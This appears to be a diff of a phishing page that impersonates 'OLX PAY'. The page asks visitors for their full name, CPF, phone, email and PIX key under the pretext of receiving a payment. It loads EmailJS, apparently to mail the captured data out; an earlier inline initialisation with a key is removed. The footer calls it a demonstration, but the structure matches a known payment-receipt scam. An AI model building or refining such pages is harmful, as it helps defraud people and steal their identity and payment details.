@@ -9,7 +9,7 @@
 <body>
 
   <main class="card">
-    <img src="assets/images/illustration.png" class="hero-img" alt="Ilustração">
+    <img src="./assets/images/illustration.png" class="hero-img" alt="Ilustração">
 
     <h1>Cadastro de Carteira <span>OLX PAY</span></h1>
     <p class="subtitle">
@@ -19,19 +19,19 @@
     <form id="formDados" novalidate>
 
       <label>Nome completo*
-        <input type="text" name="nome" placeholder="Nome completo" required>
+        <input type="text" name="nome" required>
       </label>
 
       <label>CPF*
-        <input type="text" name="cpf" placeholder="000.000.000-00" required>
+        <input type="text" name="cpf" required>
       </label>
 
       <label>Telefone*
-        <input type="tel" name="telefone" placeholder="(00) 00000-0000" required>
+        <input type="tel" name="telefone" required>
       </label>
 
       <label>E-mail*
-        <input type="email" name="email" placeholder="Digite seu e-mail" required>
+        <input type="email" name="email" required>
       </label>
 
       <fieldset>
@@ -43,28 +43,24 @@
       </fieldset>
 
       <label>Digite sua chave PIX*
-        <input type="text" name="pixChave" placeholder="Digite sua chave PIX" required>
+        <input type="text" name="pixChave" required>
       </label>
 
       <button type="submit">RECEBER</button>
     </form>
 
     <footer>
-      <p class="links">
-        Segurança · Termos de Uso · Política de Privacidade
-      </p>
       <p class="copy">
         © 2026 OLX PAY – Plataforma demonstrativa
       </p>
     </footer>
   </main>
 
+  <!-- EmailJS CDN -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+  <!-- Seu JS -->
   <script src="js/script.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-<script>
-  (function(){
-    emailjs.init(mtr3UbcISizngEXR8);
-  })();
-</script>
+
 </body>
 </html>
